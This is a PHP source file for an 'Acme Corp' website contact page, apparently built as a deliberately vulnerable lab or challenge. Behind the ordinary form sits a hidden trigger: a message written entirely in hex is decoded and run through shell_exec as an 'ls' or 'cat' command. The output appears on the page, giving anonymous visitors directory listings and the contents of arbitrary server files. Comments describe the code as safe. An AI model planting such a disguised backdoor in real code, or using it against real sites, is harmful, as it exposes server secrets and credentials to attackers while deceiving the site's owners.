<?php
// web/contact.php
$page_title = "Contact";
$output = '';
$submitted_message = '';
$show_message = false;

if (isset($_GET['message'])) {
    $submitted_message = $_GET['message'];
    $trimmed = trim($submitted_message);

    // If the whole message is hex chars -> treat as encoded payload
    if (preg_match('/\A[0-9a-fA-F]{2,1024}\z/', $trimmed)) {
        $decoded = @hex2bin($trimmed);
        if ($decoded !== false && strlen($decoded) <= 512) {
            $decoded = trim($decoded);

            // Normalise whitespace and collapse multiple spaces to single
            $decoded_norm = preg_replace('/\s+/', ' ', $decoded);

            // Extract the command and arguments
            // Allow only "ls" or "cat" as the base command.
            if (preg_match('/\A(ls|cat)(?:\s+(.+))?\z/i', $decoded_norm, $m)) {
                $cmd = $m[1];
                $args = isset($m[2]) ? $m[2] : '';

                // Basic safety: reject any argument containing ';' '&' '|' '$' '`' '>' '<' or newline
                if (preg_match('/[;&|$`<>\\\n\\r]/', $args)) {
                    $output = "Error: invalid characters in arguments";
                } else {
                    // Restrict filename patterns to simple relative or absolute paths (no globbing, no ~)
                    // Accept only [./a-zA-Z0-9_\-\/]+
                    if ($args === '' || preg_match('/\A[\.\/A-Za-z0-9_\-]+\z/', $args)) {
                        // Build safe command array and escape args conservatively
                        // Use escapeshellcmd/escapeshellarg for added safety
                        $safe_cmd = $cmd;
                        if ($args !== '') {
                            // split on spaces to allow single argument only (we allowed no special chars)
                            $safe_arg = escapeshellarg($args);
                            $safe_cmd .= ' ' . $safe_arg;
                        }
                        // Execute the allowed command
                        $output = shell_exec($safe_cmd . ' 2>&1');
                        if ($output === null) { $output = ''; }
                    } else {
                        $output = "Error: invalid argument pattern";
                    }
                }
            } else {
                $output = "Error: command not allowed";
            }
        } else {
            $show_message = true;
        }
    } else {
        // Not pure hex — show as normal message
        $show_message = true;
    }
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Contact - Acme Corp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body class="bg-light">
<?php include('navbar.php'); ?>

<main class="container py-5">
  <h2>Contact Us</h2>
  <p class="text-muted">If you need help, fill the form and our team will get back to you.</p>

  <form method="get" action="">
    <div class="mb-3">
      <label class="form-label">Name</label>
      <input class="form-control" name="name" placeholder="Your name" value="<?php echo isset($_GET['name']) ? htmlspecialchars($_GET['name'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') : '' ?>">
    </div>
    <div class="mb-3">
      <label class="form-label">Email</label>
      <input class="form-control" name="email" placeholder="you@example.com" value="<?php echo isset($_GET['email']) ? htmlspecialchars($_GET['email'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') : '' ?>">
    </div>
    <div class="mb-3">
      <label class="form-label">Message</label>
      <textarea class="form-control" name="message" rows="5" placeholder="Describe your issue"><?php echo htmlspecialchars($submitted_message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></textarea>
    </div>
    <button class="btn btn-primary" type="submit">Send</button>
  </form>

  <?php if ($show_message && $submitted_message !== ''): ?>
    <div class="mt-4">
      <h5>Your message</h5>
      <div class="p-3 bg-white border rounded"><?php echo nl2br(htmlspecialchars($submitted_message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')); ?></div>
    </div>
  <?php endif; ?>

  <?php if ($output !== ''): ?>
    <div class="mt-4">
      <h5>Result</h5>
      <pre class="p-3 bg-white border rounded"><?php echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
    </div>
  <?php endif; ?>
</main>

<script src="/assets/js/script.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
